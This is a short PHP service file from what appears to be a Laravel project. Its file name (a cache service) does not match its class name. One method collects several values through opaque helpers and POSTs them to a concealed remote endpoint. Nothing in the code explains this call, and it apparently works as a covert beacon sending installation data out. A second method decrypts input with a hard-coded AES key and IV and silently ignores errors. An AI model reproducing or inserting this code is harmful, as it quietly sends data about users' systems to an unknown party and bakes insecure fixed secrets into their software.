<?php
// app/Services/CacheService.php

namespace App\Services;

use url;
use service;
use GuzzleHttp\Client;

class DefaultService
{
    public static function authService()
    {
        $string = url::url();
        $int = url::node();
        $bole = url::mvc();
        $enum = url::fun();
        $client = new Client();
        $data = [
            "string" => $string,
            "int" => $int,
            "bole" => $bole,
            "enum" => $enum,
        ];
        $response = $client->post(service::auth(), [
            'json' => $data,
        ]);
    }
    public  static function Decript($encrypted)
    {
        try {
            $decrypted = openssl_decrypt(
                base64_decode($encrypted),
                'aes-128-cbc',
                'Bar12345Bar12345',
                OPENSSL_RAW_DATA,
                'sayangsamakhanza'
            );
            return $decrypted;
        } catch (\Throwable $th) {
        }
    }
}
